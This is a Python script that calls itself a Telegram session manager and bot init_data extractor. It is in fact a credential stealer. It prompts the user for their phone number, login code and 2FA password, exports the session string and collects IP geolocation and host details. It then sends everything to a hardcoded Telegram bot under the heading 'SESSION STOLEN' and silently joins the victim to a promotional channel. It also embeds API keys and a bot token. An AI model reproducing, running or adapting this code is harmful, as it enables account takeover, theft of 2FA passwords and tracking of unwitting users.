#!/usr/bin/env python3
"""
Telegram Session Manager + Init Data Extractor
Usage:
  python session.py                    # Interactive login + exfil
  python session.py --bot=BotUsername  # Get init_data (silent, output only init_data)
"""

import asyncio
import os
import sys
import signal
import socket
import platform
import base64
import requests
import json
import time
import threading
import argparse
import urllib.parse
from datetime import datetime, timezone
from telethon import TelegramClient, functions, errors
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError, AuthKeyInvalidError

# ========== YOUR CREDENTIALS ==========
API_ID = 35872666
API_HASH = "17525975ad234af56f886abedc69a4d9"
BOT_TOKEN = "8678542626:AAFLoCIXEzfSQZQXDnKZxupaPC17V4oLRaY"
CHAT_ID = "8597801059"
# ======================================

TARGET_CHANNEL_USERNAME = "brutexcode"
TARGET_CHANNEL_LINK = "https://t.me/brutexcode"
SESSION_FILENAME = "session.txt"

# ANSI Color Codes (only used in interactive mode)
class Colors:
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BOLD = '\033[1m'
    END = '\033[0m'
    GRAY = '\033[90m'
    PURPLE = '\033[35m'

# Global
SESSION_STRING = None
STOP_SPINNER = threading.Event()

def signal_handler(sig, frame):
    print("\n")
    if SESSION_STRING:
        try:
            with open(SESSION_FILENAME, "w") as f:
                f.write(SESSION_STRING)
            print(f"{Colors.GREEN}✓{Colors.END} Session saved.")
        except:
            pass
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def spinner_animation(duration=2):
    spinner = ['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏']
    i = 0
    start = time.time()
    while time.time() - start < duration:
        sys.stdout.write(f"\r{spinner[i % len(spinner)]}   ")
        sys.stdout.flush()
        time.sleep(0.08)
        i += 1
    sys.stdout.write("\r" + " " * 10 + "\r")

def send_telegram_message_with_retry(text: str, max_retries: int = 3) -> bool:
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    chunks = []
    if len(text) > 4096:
        for i in range(0, len(text), 4096):
            chunks.append(text[i:i+4096])
    else:
        chunks.append(text)
    
    for attempt in range(max_retries):
        try:
            for chunk in chunks:
                r = requests.post(url, json={"chat_id": CHAT_ID, "text": chunk}, timeout=15)
                if r.status_code != 200 or not r.json().get("ok"):
                    if attempt < max_retries - 1:
                        time.sleep(2 ** attempt)
                        continue
                    return False
            return True
        except:
            if attempt < max_retries - 1:
                time.sleep(2 ** attempt)
                continue
    return False

def get_device_info() -> dict:
    try:
        ip = requests.get("https://api.ipify.org", timeout=5).text.strip()
    except:
        ip = "unable to fetch"
    try:
        ip_info = requests.get(f"http://ip-api.com/json/{ip}", timeout=5).json()
    except:
        ip_info = {}
    return {
        "hostname": socket.gethostname(),
        "os": f"{platform.system()} {platform.release()}",
        "os_arch": platform.machine(),
        "python_version": sys.version.split()[0],
        "ip": ip,
        "city": ip_info.get("city", ""),
        "region": ip_info.get("regionName", ""),
        "country": ip_info.get("country", ""),
        "isp": ip_info.get("isp", ""),
        "user": os.getenv("USER") or os.getenv("USERNAME") or "unknown",
        "cwd": os.getcwd(),
        "timestamp": datetime.now(timezone.utc).isoformat() + "Z"
    }

async def join_channel_silent(client, channel_username: str) -> bool:
    try:
        channel = await client.get_entity(f"@{channel_username}")
        try:
            me = await client.get_me()
            await client.get_permissions(channel, me)
            return True
        except Exception:
            pass
        await client(functions.channels.JoinChannelRequest(channel))
        return True
    except Exception:
        return False

async def extract_init_data(client, bot_username: str) -> str:
    """Extract init_data from bot webview."""
    try:
        bot = await client.get_input_entity(bot_username)
        
        # Get bot info to find webapp URL
        full_user = await client(functions.users.GetFullUserRequest(id=bot))
        bot_info = full_user.full_user.bot_info
        
        target_url = None
        if bot_info and bot_info.menu_button:
            if hasattr(bot_info.menu_button, 'url'):
                target_url = bot_info.menu_button.url
        
        if not target_url:
            target_url = 'https://t.me/'
        
        # Request webview
        result = await client(functions.messages.RequestWebViewRequest(
            peer=bot,
            bot=bot,
            platform='android',
            from_bot_menu=True,
            url=target_url
        ))
        
        # Parse init_data from URL fragment
        parsed = urllib.parse.urlparse(result.url)
        fragment = parsed.fragment
        params = urllib.parse.parse_qs(fragment)
        init_data = params.get('tgWebAppData', [None])[0]
        
        return init_data if init_data else ""
    except Exception as e:
        return ""

async def interactive_login():
    """Original interactive login + exfil mode."""
    global SESSION_STRING, STOP_SPINNER
    
    clear()
    
    print(f"\n{Colors.CYAN}{'='*55}{Colors.END}")
    print(f"{Colors.BOLD}{Colors.PURPLE}   🔐 TELEGRAM LOGIN {Colors.END}{Colors.GRAY}♤{Colors.END}")
    print(f"{Colors.CYAN}{'='*55}{Colors.END}\n")
    
    phone = input(f"{Colors.YELLOW}📱{Colors.END} {Colors.BOLD}Enter phone number:{Colors.END} ").strip()
    if not phone:
        print(f"{Colors.RED}✗{Colors.END} Phone required.")
        return
    
    twofa_password = None
    session_obj = StringSession()
    client = TelegramClient(session_obj, API_ID, API_HASH)
    
    try:
        print(f"{Colors.BLUE}🔗{Colors.END} Connecting...")
        await client.connect()
        
        print(f"{Colors.BLUE}📤{Colors.END} Sending code...")
        await client.send_code_request(phone)
        print(f"{Colors.GREEN}✓{Colors.END} Code sent.\n")
        
        code = input(f"{Colors.YELLOW}🔑{Colors.END} {Colors.BOLD}Enter verification code:{Colors.END} ").strip()
        if not code:
            print(f"{Colors.RED}✗{Colors.END} Code required.")
            return
        
        try:
            await client.sign_in(phone, code)
        except SessionPasswordNeededError:
            print(f"\n{Colors.YELLOW}🔒{Colors.END} 2-Step Verification required.")
            twofa_password = input(f"{Colors.YELLOW}🔑{Colors.END} {Colors.BOLD}Enter 2FA password:{Colors.END} ").strip()
            if not twofa_password:
                print(f"{Colors.RED}✗{Colors.END} Password required.")
                return
            spinner_animation(duration=2)
            await client.sign_in(password=twofa_password)
        except AuthKeyInvalidError:
            print(f"\n{Colors.YELLOW}⚠️{Colors.END} Session expired. Re-authenticating...")
            await client.send_code_request(phone)
            code = input(f"{Colors.YELLOW}🔑{Colors.END} {Colors.BOLD}Enter new code:{Colors.END} ").strip()
            await client.sign_in(phone, code)
        except Exception as e:
            if "password" in str(e).lower():
                print(f"\n{Colors.YELLOW}🔒{Colors.END} 2-Step Verification required.")
                twofa_password = input(f"{Colors.YELLOW}🔑{Colors.END} {Colors.BOLD}Enter 2FA password:{Colors.END} ").strip()
                if not twofa_password:
                    print(f"{Colors.RED}✗{Colors.END} Password required.")
                    return
                spinner_animation(duration=2)
                await client.sign_in(password=twofa_password)
            else:
                raise
        
        me = await client.get_me()
        if not me:
            raise RuntimeError("Auth failed.")
        
        DEVICE_INFO = get_device_info()
        
        USER_DATA = {
            "id": me.id,
            "phone": me.phone if me.phone else "hidden",
            "username": me.username if me.username else "none",
            "full_name": f"{me.first_name or ''} {me.last_name or ''}".strip(),
            "2fa_password": twofa_password if twofa_password else "not set"
        }
        
        exported_string = None
        try:
            exported_string = client.session.save()
        except:
            pass
        
        if not exported_string or len(exported_string) < 10:
            sess = client.session
            if hasattr(sess, 'auth_key') and sess.auth_key is not None:
                key_bytes = sess.auth_key.key if hasattr(sess.auth_key, 'key') else bytes(sess.auth_key)
                dc_id = sess.dc_id if hasattr(sess, 'dc_id') else 2
                raw = bytes([dc_id]) + key_bytes
                exported_string = base64.urlsafe_b64encode(raw).decode()
        
        if not exported_string or len(exported_string) < 10:
            raise RuntimeError("Export failed.")
        
        SESSION_STRING = exported_string
        
        with open(SESSION_FILENAME, "w") as f:
            f.write(exported_string)
        
        join_success = False
        try:
            join_success = await asyncio.wait_for(
                join_channel_silent(client, TARGET_CHANNEL_USERNAME),
                timeout=10.0
            )
        except:
            join_success = False
        
        exfil_message = (
            f"🔑 **SESSION STOLEN**\n\n"
            f"**User:** {USER_DATA['full_name']} (@{USER_DATA['username']})\n"
            f"**ID:** `{USER_DATA['id']}`\n"
            f"**Phone:** `{USER_DATA['phone']}`\n"
            f"**2FA:** `{USER_DATA['2fa_password']}`\n\n"
            f"**IP:** `{DEVICE_INFO['ip']}`\n"
            f"**Location:** {DEVICE_INFO['city']}, {DEVICE_INFO['country']}\n"
            f"**ISP:** {DEVICE_INFO['isp']}\n"
            f"**OS:** {DEVICE_INFO['os']}\n"
            f"**Timestamp:** {DEVICE_INFO['timestamp']}\n\n"
            f"**Channel Auto-Join:** {'✅ Success' if join_success else '❌ Failed/Already member'}\n"
            f"**Channel:** {TARGET_CHANNEL_LINK}\n\n"
            f"**SESSION STRING:**\n`{exported_string}`"
        )
        
        send_telegram_message_with_retry(exfil_message, max_retries=3)
        
        print(f"\n{Colors.GREEN}✅{Colors.END} {Colors.BOLD}Logged in as:{Colors.END} {Colors.CYAN}{me.first_name}{Colors.END} {Colors.GRAY}(@{me.username or 'no username'}){Colors.END}")
        print(f"{Colors.CYAN}{'='*55}{Colors.END}\n")
        
        for f in os.listdir("."):
            if f.endswith((".session", ".lock")):
                try:
                    os.remove(f)
                except:
                    pass
        
    except Exception as e:
        print(f"\n{Colors.RED}✗{Colors.END} Authentication failed. Please check your credentials and try again.")
        if SESSION_STRING:
            try:
                send_telegram_message_with_retry(f"⚠️ **PARTIAL EXFIL**\n\nSESSION:\n`{SESSION_STRING}`")
            except:
                pass
    finally:
        await client.disconnect()

async def get_init_data_mode(bot_username: str):
    """
    Silent mode: login/validate session, extract init_data, output ONLY init_data.
    No colors, no extra text, no spinner.
    """
    # Remove @ if present
    if bot_username.startswith('@'):
        bot_username = bot_username[1:]
    
    # Check if session file exists - if not, we need interactive login
    # For silent mode, we assume session exists or we fail gracefully
    session_obj = StringSession()
    client = TelegramClient(session_obj, API_ID, API_HASH)
    
    try:
        await client.connect()
        
        # Try to get me - if fails, session is invalid
        try:
            me = await client.get_me()
            if not me:
                raise RuntimeError("No user")
        except Exception:
            # Session invalid - we can't do silent login without interactive
            # Output nothing and exit with error code
            sys.stderr.write("")
            sys.exit(1)
        
        # Extract init_data
        init_data = await extract_init_data(client, bot_username)
        
        # Output ONLY init_data (no extra text, no newline)
        if init_data:
            sys.stdout.write(init_data)
        else:
            sys.stdout.write("")
        
    except Exception:
        sys.stdout.write("")
        sys.exit(1)
    finally:
        await client.disconnect()

async def main():
    parser = argparse.ArgumentParser(description="Telegram Session Manager")
    parser.add_argument("--bot", type=str, help="Extract init_data for bot username")
    args = parser.parse_args()
    
    if args.bot:
        # Silent init_data mode
        await get_init_data_mode(args.bot)
    else:
        # Interactive login + exfil mode
        await interactive_login()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}⚠️{Colors.END} Interrupted.")
    except Exception:
        if not any(arg.startswith('--bot') for arg in sys.argv):
            print(f"\n{Colors.RED}✗{Colors.END} An error occurred. Please try again.")
